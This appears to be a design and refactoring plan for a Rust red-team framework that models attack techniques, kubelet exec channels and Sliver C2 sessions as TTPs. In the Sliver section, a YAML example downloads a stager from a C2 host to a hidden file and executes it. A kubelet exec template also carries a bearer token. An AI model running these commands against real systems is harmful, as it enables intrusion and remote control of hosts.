# Tool Abstraction & Generic Exec-Channel Plan

## Background and Motivation

Today, every TTP procedure must name a concrete binary command. If a TTP needs
to make an HTTP request, you write a `curl` command once, a `wget` command once,
etc., and duplicate this across every TTP that does HTTP. More critically,
`ran-ws` (the Kubelet exec transport) is **hardcoded into Rust** in three places
rather than modelled as a TTP like all other tools, which means adding or
replacing it requires a code change.

This plan unifies both problems under a single concept — **Tool TTPs** — that
scales to arbitrary tools, implicit-exec channels, and future C2 agents such as
Sliver, without any special-casing in the Rust runtime.

---

## Implementation Status (2026-04-30)

### Completed in this branch

- `OutputTransformKind` moved to domain and reused by campaign/c2 paths.
- `KubeletExecSource` now carries `envelope` and `output_transform` metadata.
- `RelationSummary` and graph edge metadata now propagate `output_transform`.
- `parse_kubelet_exec_source_relation()` now preserves `all(k8s.node)` marker
    relations and stores envelope/transform metadata.
- `wrap_command_for_hops()` is now metadata-driven (`rel.wrap_command` +
    `rel.output_transform`) and no longer depends on kubelet relation-name
    special-casing.
- Legacy hardcoded kubelet command construction helpers in execution routing
    were removed.
- `KUBELET_EXEC_TOOLS` hardcoded analyzer constant was removed; kubelet source
    expansion is now marker-driven.
- Regression tests were added for:
    - kubelet marker parse metadata
    - marker expansion metadata propagation
    - metadata-driven hop wrapping and output transform propagation

### Current test/build status

- `cargo test -p campaign`: passing (298 tests).
- New kubelet metadata regression tests are passing.

### Remaining phases from this plan

- Add `c2.session` effect path and Sliver session-establishment TTPs.
- Implement HTTP request abstraction/library TTP follow-up.
- Decide whether to keep or remove the temporary migration fallback language in
    this doc now that metadata-driven routing is the active path.

---

## Core Insight: One Concept, Not Three

Previous design discussions proposed separate abstraction layers (Operation
Adapters, Channel Providers, C2 Backend declarations). After analysing the Redis
RCE pattern it is clear those are all the same thing:

> **A tool is a TTP. The effect the TTP declares is what makes that tool available
> as an exec channel.**

| Tool | TTP | Effect declared |
|---|---|---|
| `redis-cli` | `exploit-redis-cve-2022-0543` | `rce.can-exec(${SRC}, ${TARGET_ID})` |
| `ran-ws` | `drop_ran-ws` / `drop_fileless_binary` | `k8s.kubelet-exec(sys, all(k8s.Node))` |
| `nsenter` | *(escape TTP)* | `container.escape(${SRC})` |
| `curl` | *(proposed: http.request TTP)* | *(no exec-channel effect needed)* |
| Sliver stager | *(proposed: deploy-sliver TTP)* | `c2.session(sliver, ${TARGET_ID})` |

The exec-channel effects (`rce.can-exec`, `container.escape`, …) store an
**envelope** — the grounded command template with `${CMD}` as a slot — on the
graph edge. Every subsequent command routed over that edge calls
`rel.wrap_command(inner_cmd)`, which substitutes `${CMD}`. This is already fully
working for `rce.can-exec` and `container.escape`.

`ran-ws` / `kubelet-pod-exec` is the **only** exec channel that does not follow
this pattern today. Instead, it is hardcoded in three Rust locations. This plan
removes that special case entirely.

---

## Current Hardcoding That Must Be Removed

### 1. `KUBELET_EXEC_TOOLS` constant
**File:** `crates/campaign/src/analyzers.rs`
```rust
const KUBELET_EXEC_TOOLS: &[&str] = &["ran-ws"];
```
Used by `KubeletExecSourceAnalyzer` to decide which pods can reach kubelet.
This should not exist — it embeds tool knowledge into inference logic.

### 2. `build_kubelet_exec_command()`
**File:** `crates/campaign/src/campaign/execution.rs`
Constructs the `ran-ws --url "wss://..."` command string directly from
campaign entity data (node IP, namespace, pod name, container, token).
This is the envelope template rendered at routing time — it belongs on the
graph edge, not in Rust code.

### 3. `"kubelet-pod-exec"` relation-name match + `OutputTransform::JsonEnvelope` emission
**File:** `crates/campaign/src/campaign/execution.rs` – `wrap_command_for_hops()`
```rust
if rel.name == "kubelet-pod-exec" {
    match self.build_kubelet_exec_command(src, tgt, &procedure.command) {
        Some(cmd) => {
            output_transform = Some(OutputTransform::JsonEnvelope);
            cmd
        }
        ...
    }
}
```
Picks `ran-ws` by relation-name string match. Must become data-driven.

### 4. `unwrap_kubelet_json_response()` dispatch in `on_ttp_executed()`
**File:** `crates/campaign/src/campaign/execution.rs`
Checks `cmd.output_transform == Some(OutputTransform::JsonEnvelope)` at
execution time and calls the hard-coded unwrap function. The **concept** of an
output transform stays (it needs to handle raw bytes before parsers run), but
its **selection** must come from the edge metadata, not a compile-time match.

---

## What Changes

### Step 1 — Add `envelope` and `output_transform` to `KubeletExecSource`

**File:** `crates/domain/relations.rs`

`KubeletExecSource` currently holds only `pod_id` and `node_id`. Add the same
fields that `RceCanExec` and `ContainerEscape` already have:

```rust
pub struct KubeletExecSource {
    pub pod_id: EntityId,
    pub node_id: EntityId,
    /// Command template with ${CMD} placeholder, e.g.:
    /// `ran-ws --url "wss://${NODE_HOST}:10250/exec/${NS}/${POD}/${CTR}
    ///  ?output=1&error=1&command=${CMD}" --token ${TOKEN}`
    /// Stored at relation-creation time so routing can call
    /// rel.wrap_command(inner_cmd) without knowing about ran-ws.
    pub envelope: Option<String>,
    /// Output post-processing required after running a command over this
    /// channel. Mirrors ExecTtp::output_transform.
    pub output_transform: Option<OutputTransformKind>,
}
```

Add constructors mirroring `RceCanExec`:
```rust
impl KubeletExecSource {
    pub fn with_envelope(mut self, envelope: impl Into<String>) -> Self { ... }
    pub fn with_output_transform(mut self, t: OutputTransformKind) -> Self { ... }
}
```

`OutputTransformKind` is a new enum (or a reuse of `OutputTransform` from
`crates/c2`) with variant `JsonEnvelope`. Move it to `crates/domain` so both
the relation type and the exec pipeline can reference it without a circular
dependency.

Also update `RelationSummary::from_relation()` to extract `envelope` and
`output_transform` from `KubeletExecSource` the same way it already does for
`RceCanExec` and `ContainerEscape`.

Add `output_transform: Option<OutputTransformKind>` to `RelationSummary` itself.

---

### Step 2 — Fix the `k8s.kubelet-exec` effect handler

**File:** `crates/campaign/src/effects.rs` – `parse_kubelet_exec_source_relation()`

Currently, for the `all(k8s.Node)` target form (the common case used by
`drop_ran-ws`), the handler returns `FactsUpdate::default()` — emitting nothing.
Instead it must:

1. Read `PROCEDURE_CMD` from `ctx` (the grounded command that was just run to
   drop the tool), exactly as `rce.can-exec` reads it.
2. Build a `ran-ws`-style envelope template from `PROCEDURE_CMD` with `${CMD}`
   substituted for the inner command. For the kubelet case the envelope is the
   `ran-ws --url ...` command with the inner command URL-encoded as `${CMD}`.
   Because the exact node/pod/container are resolved at routing time (not here),
   the stored envelope is still a **template** with those vars unresolved —
   routing resolves them against campaign state when wrapping.
3. Store `output_transform: OutputTransformKind::JsonEnvelope` on the relation.
4. Emit a `KubeletExecSource` with the envelope and output transform set.

For the `all(k8s.Node)` case specifically: the `KubeletExecSourceAnalyzer`
currently infers per-node edges lazily. With this change the effect handler still
emits no *specific* node edges (because the node is unknown at effect-parse time),
but it records the tool as capable on the executing entity. The
`KubeletExecSourceAnalyzer` can remain as the mechanism that creates the actual
`kubelet-exec` (pod→node) edges once both a tool and a node are known — but it
no longer needs to hardcode `ran-ws` by name. Instead it checks whether the pod
has any binary whose name appears in a `kubelet-exec` capability declaration on
that entity (see Step 4).

Alternatively, and more cleanly: the `k8s.kubelet-exec` effect with `all(k8s.Node)`
emits a **marker entity update** on the executing pod (e.g. sets a capability
flag `can_kubelet_exec: true`) and the analyzer infers edges based on that flag,
decoupled from any specific binary name.

---

### Step 3 — Make `wrap_command_for_hops()` data-driven

**File:** `crates/campaign/src/campaign/execution.rs`

Replace the `"kubelet-pod-exec"` string match:

```rust
// BEFORE
if rel.name == "kubelet-pod-exec" {
    match self.build_kubelet_exec_command(src, tgt, &procedure.command) {
        Some(cmd) => { output_transform = Some(OutputTransform::JsonEnvelope); cmd }
        None => { ... }
    }
} else {
    rel.wrap_command(&procedure.command)
}
```

```rust
// AFTER
if rel.envelope.is_none() && rel.name == "kubelet-pod-exec" {
    // Legacy fallback: kubelet-pod-exec edges created before envelope storage
    // was introduced. Resolve dynamically as before.
    match self.build_kubelet_exec_command(src, tgt, &procedure.command) {
        Some(cmd) => { output_transform = Some(OutputTransform::JsonEnvelope); cmd }
        None => procedure.command.clone()
    }
} else {
    // All modern edges (rce.can-exec, container.escape, kubelet-pod-exec
    // with envelope stored) go here.
    if let Some(ref t) = rel.output_transform {
        output_transform = Some(OutputTransform::from(t));
    }
    rel.wrap_command(&procedure.command)
}
```

Once all `kubelet-pod-exec` edges in the wild have envelopes (i.e. after
`drop_ran-ws` has been run at least once under the new code), the legacy branch
can be removed. This gives a clean migration path without breaking existing
saved campaigns.

---

### Step 4 — Remove `KubeletExecSourceAnalyzer`'s tool hardcode

**File:** `crates/campaign/src/analyzers.rs`

```rust
// BEFORE
const KUBELET_EXEC_TOOLS: &[&str] = &["ran-ws"];
```

Replace with: the analyzer infers `kubelet-exec` (pod→node) edges whenever a
pod has **any binary** that is flagged as a kubelet-exec capable tool. That flag
is stored on the binary entry itself rather than as a compile-time list.

Implementation options, in order of preference:

**Option A (recommended):** Extend `BinaryPresence::Present(path)` with an
optional capabilities set, e.g.:
```rust
pub enum BinaryPresence {
    Unknown,
    Absent,
    Present { path: String, capabilities: Vec<String> },
}
```
The `k8s.kubelet-exec` effect adds `"kubelet-exec"` to the capabilities of the
binary it just recorded. `KubeletExecSourceAnalyzer` checks
`pod.system.has_binary_with_capability("kubelet-exec")` instead of a hardcoded
name list.

**Option B (simpler short-term):** The `k8s.kubelet-exec(sys, all(k8s.Node))`
effect stores a new field `kubelet_exec_capable: bool` on the pod's `SystemInfo`
directly. The analyzer reads that field.

**Option C (defer removal):** Keep the hardcoded list for now, but make it
configurable via a `ran.yaml` field. Remove it in a future pass once Option A is
in place.

The choice of Option A vs B depends on whether capabilities on binaries are
useful elsewhere. They likely are (e.g. `kubectl` being capable of `k8s.can-exec`
is implicit; surfacing it explicitly enables future reasoning).

---

### Step 5 — `KubeletExecSinkAnalyzer` remains unchanged

**File:** `crates/campaign/src/analyzers.rs` – `KubeletExecSinkAnalyzer`

This analyzer infers the `kubelet-pod-exec` (node→pod) edges from
`kubelet-exec` (pod→node) and `runs-on` (pod→node) relations. It does not
reference any tool by name, so it needs no changes. It remains responsible for
propagating the node→pod exec-channel topology.

---

### Step 6 — HTTP request abstraction (multi-procedure TTPs)

This is the "curl vs wget" problem — a TTP that makes an HTTP request should
not need to duplicate the request logic for every HTTP tool.

The existing multi-procedure model already handles this:
```yaml
procedures:
  - key: curl
    tool: curl
    command: curl -sS -X POST -H "Authorization: Bearer ${TOKEN}" -d "${PAYLOAD}" ${URL}
  - key: wget
    tool: wget
    command: wget -qO- --method=POST --header="Authorization: Bearer ${TOKEN}" \
             --body-data="${PAYLOAD}" ${URL}
```

The frontend already displays these as selectable variants and filters them by
binary availability (`executingSystemHasTool()`). The backend already tries
alternative procedures when a binary is recorded `Absent`.

**What is proposed to make this scale** is not a new concept but an improvement
to ergonomics:

#### 6a — Shared parameter definitions across procedures

Today each procedure's command template repeats `${URL}`, `${TOKEN}`, `${PAYLOAD}`.
The parameter list at TTP level already defines these. No change needed — this
is already how it works.

#### 6b — HTTP-specific parameter defaults and types

Define a conventional set of parameters for HTTP-request TTPs:
- `URL` (string, required)
- `METHOD` (string, default `GET`)
- `HEADERS` (string, default `""`)
- `PAYLOAD` (string, default `""`)
- `TIMEOUT` (int, default `30`)

TTPs that make HTTP requests declare these parameters; the procedure commands
use them. This is a convention, not a schema change.

#### 6c — A "http.request" Tool TTP library

Create `armory/TTPs/Tools/http-request-curl.yaml` and
`armory/TTPs/Tools/http-request-wget.yaml` as standalone TTPs that implement
just the HTTP call:

```yaml
# armory/TTPs/Tools/http-request-curl.yaml
name: HTTP Request via curl
tactic: Execution
procedures:
  - key: curl
    tool: curl
    command: >
      curl -sS -X ${METHOD} ${HEADERS_FLAGS} ${BODY_FLAG} "${URL}"
```

Other TTPs that need HTTP calls would include these as their procedures using
a proposed `procedure_ref` mechanism — or more pragmatically, operators can
continue using inline procedures and rely on procedure key matching for
tool selection. The "library TTP" approach is a nice-to-have that avoids
duplication across the armory but is not required for the plan to be complete.

---

### Step 7 — Sliver and future C2 agents

The current `C2Backend` trait and `C2Manager` registry are already the right
abstraction. No structural change is needed.

What is missing is the **session establishment TTP** pattern:

```yaml
# armory/TTPs/Lateral Movement/deploy-sliver-implant.yaml
name: Deploy Sliver Implant
tactic: Lateral Movement
procedures:
  - key: curl-stager
    tool: curl
    command: curl -sL https://${C2_HOST}/s -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x
effects:
  - c2.session(sliver, ${TARGET_ID})
```

The `c2.session` effect:
1. Is handled by a new effect handler in `crates/campaign/src/effects.rs`
2. Records the Sliver backend ID on a new `SessionChannel` relation (already
   defined in `crates/domain` as `SessionChannel`) from the C2 server to the
   target entity
3. The routing engine in `route_exec_channel()` checks for an active session
   on the target before graph traversal — it already does this for
   `SessionStatus::Active` sessions. The session backend is looked up by
   `backend_id` in `C2Manager`.

No YAML config file for the Sliver backend is needed. The Sliver `C2Backend`
implementation is registered in Rust. What becomes data-driven is **which
targets have a session**, because the TTP effect establishes that in the graph.

---

## File-by-File Change Summary

| File | Change |
|---|---|
| `crates/domain/relations.rs` | Add `envelope`, `output_transform` fields to `KubeletExecSource`; add builder methods; update `RelationSummary::from_relation()` and `RelationSummary` struct |
| `crates/domain/mod.rs` or new `crates/domain/transform.rs` | Move `OutputTransformKind` enum here (currently `OutputTransform` lives in `crates/c2`) so domain types can reference it |
| `crates/c2/src/types.rs` | Replace or alias `OutputTransform` to use the domain type |
| `crates/campaign/src/effects.rs` | Fix `parse_kubelet_exec_source_relation()` to store envelope + output transform; add `c2.session` handler |
| `crates/campaign/src/analyzers.rs` | Remove `KUBELET_EXEC_TOOLS`; replace name-based binary check with capability-based check (Step 4) |
| `crates/campaign/src/campaign/execution.rs` | Replace `"kubelet-pod-exec"` string match + `build_kubelet_exec_command()` with data-driven `rel.envelope` + `rel.output_transform` read; keep legacy fallback branch during migration |
| `crates/campaign/src/output_parsers/mod.rs` | `unwrap_kubelet_json_response()` stays; its dispatch becomes driven by `OutputTransform::JsonEnvelope` on the edge rather than a hardcoded condition |
| `armory/TTPs/Execution/drop_ran-ws.yaml` | Update effect to `k8s.kubelet-exec(sys, all(k8s.Node))` — already correct; verify envelope is stored correctly after Step 2 |
| `armory/TTPs/Execution/execute_node-proxy-exec.yaml` | Re-enable and keep as the manual override for direct kubelet exec without using the inference chain |
| `armory/TTPs/Lateral Movement/deploy-sliver-implant.yaml` | New file; establishes Sliver session via `c2.session` effect (Step 7) |

---

## Migration Strategy

### Phase A — Data model (no behaviour change yet)
1. Add `envelope` + `output_transform` to `KubeletExecSource` and `RelationSummary`
2. Move `OutputTransformKind` to `crates/domain`
3. Update `RelationSummary::from_relation()` to populate new fields
4. All existing code still takes the `"kubelet-pod-exec"` string-match branch
   because edges lack envelopes

### Phase B — Effect handler fix
5. Fix `parse_kubelet_exec_source_relation()` to store envelope + output transform
6. New `kubelet-exec` edges now carry the envelope — routing takes the new branch
7. Old edges (existing saved campaigns) still fall to the legacy branch
8. Add tests: same observable behaviour, envelope now stored on edge

### Phase C — Routing cleanup
9. Once all tests pass and the legacy branch is verified unused in tests, add a
   deprecation log for the legacy branch
10. Remove `build_kubelet_exec_command()` in a follow-up PR once migration window
    closes

### Phase D — Analyzer cleanup
11. Replace `KUBELET_EXEC_TOOLS` constant with capability-based check
12. Remove `KubeletExecSourceAnalyzer` if the effect handler now covers its role,
    or keep it as a secondary inference path that no longer references tool names

### Phase E — HTTP abstraction (additive, no breaking changes)
13. Add multi-procedure HTTP TTPs in armory
14. Document the `METHOD`/`URL`/`PAYLOAD` convention

### Phase F — Sliver and future agents
15. Add `c2.session` effect handler
16. Add `deploy-sliver-implant.yaml` TTP
17. Wire Sliver backend registration to `C2Manager`

---

## What Does NOT Change

- The `C2Backend` trait and `C2Manager` dispatch — unchanged
- The `ExecTtp` struct and `TtpExecuted` types — unchanged
- `unwrap_kubelet_json_response()` function body — unchanged
- `KubeletExecSinkAnalyzer` — unchanged
- All existing TTP YAML files — forward-compatible
- The frontend procedure-selection UX — unchanged (procedure `tool` field still
  drives binary availability filtering)
- All existing `rce.can-exec` and `container.escape` paths — unchanged

---

## Invariant: Every Exec Channel Is a Graph Edge with an Envelope

After all phases are complete, the routing engine's `wrap_command_for_hops()`
function degenerates to a single code path:

```rust
for each hop edge:
    if let Some(ref t) = rel.output_transform {
        output_transform = Some(OutputTransform::from(t));
    }
    procedure.command = rel.wrap_command(&procedure.command);
```

The relation type name (`rce.can-exec`, `kubelet-pod-exec`, `container.escape`)
is **never** matched in routing code. Only the `envelope` and `output_transform`
fields on the edge matter. New exec-channel types can be added by writing a TTP
with an appropriate effect — zero Rust changes needed.
